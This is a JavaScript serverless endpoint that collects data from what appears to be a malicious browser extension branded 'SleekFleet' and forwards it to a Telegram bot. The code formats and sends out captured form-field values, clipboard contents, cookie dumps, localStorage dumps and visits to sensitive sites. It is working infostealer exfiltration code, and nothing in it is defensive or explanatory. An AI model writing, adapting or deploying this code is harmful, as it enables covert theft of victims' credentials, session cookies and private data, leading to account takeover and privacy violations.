export default async function handler(req, res) {
  // 1. Handle CORS Preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).json({});
  }

  // 2. Parse Body Correctly (Robust for Vercel Edge/Node)
  let payload = {};
  try {
    // Try parsing as JSON first
    const contentType = req.headers.get('content-type') || req.headers['content-type'] || '';
    
    if (contentType.includes('application/json')) {
      payload = await req.json();
    } else {
      // Fallback for raw text/string body
      const rawBody = await req.text();
      if (rawBody) {
        payload = JSON.parse(rawBody);
      }
    }
  } catch (e) {
    console.error("JSON Parse Error:", e.message);
    payload = {};
  }

  // 3. Check Method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    // 4. Format Message Based on Source Type
    let msg = "";
    const timestamp = new Date().toISOString();
    const url = payload.url || "N/A";
    const source = payload.source || "unknown";

    if (source === "input_field_capture") {
      msg = `
🚗 *SleekFleet Input Capture*

📍 Site: \`${url}\`
🏷️ Field: \`${payload.data.field_name || "Unknown"}\`
🔑 Value: \`${String(payload.data.value).substring(0, 100)}\`
⏰ Time: \`${timestamp}\`
      `.trim();
      
    } else if (source === "clipboard_sensitive" || source === "clipboard_tab_load" || source === "periodic_clipboard_check") {
      msg = `
🚗 *SleekFleet Clipboard Grab*

📋 Data: \`${String(payload.data).substring(0, 150)}\`
📍 Context: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "cookie_dump") {
      msg = `
🚗 *SleekFleet Cookie Dump*

🍪 Cookies: \`${String(payload.data).substring(0, 200)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "local_storage_dump") {
      const lsData = typeof payload.data === 'object' ? JSON.stringify(payload.data) : payload.data;
      msg = `
🚗 *SleekFleet Local Storage Dump*

💾 Data: \`${String(lsData).substring(0, 150)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "tab_navigated_to_sensitive_site") {
      msg = `
🚗 *SleekFleet Sensitive Site Visit*

🌐 URL: \`${payload.data.url}\`
📝 Title: \`${payload.data.title}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else if (source === "url_change") {
      msg = `
🚗 *SleekFleet URL Change*

🌐 New URL: \`${payload.data.url}\`
📝 Title: \`${payload.data.title}\`
⏰ Time: \`${timestamp}\`
      `.trim();

    } else {
      // Fallback
      msg = `
🚗 *SleekFleet General Data*

📦 Source: \`${source}\`
📦 Data: \`${JSON.stringify(payload.data).substring(0, 150)}\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    }

    // 5. Send to Telegram
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      try {
        const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); 

        const response = await fetch(tgUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: tgChatId, 
            text: msg, 
            parse_mode: 'Markdown' 
          }),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
          console.error(`Telegram API Error: ${response.status} ${response.statusText}`);
        } else {
          console.log("✅ Telegram Message Sent");
        }
      } catch (err) {
        console.error("❌ Telegram Fetch Failed:", err.message);
      }
    } else {
      console.log("⚠️ Telegram skipped: Missing Env Vars");
    }

    // 6. Return Success to Extension
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("💥 Handler Error:", error);
    res.status(500).json({ error: error.message });
  }
}
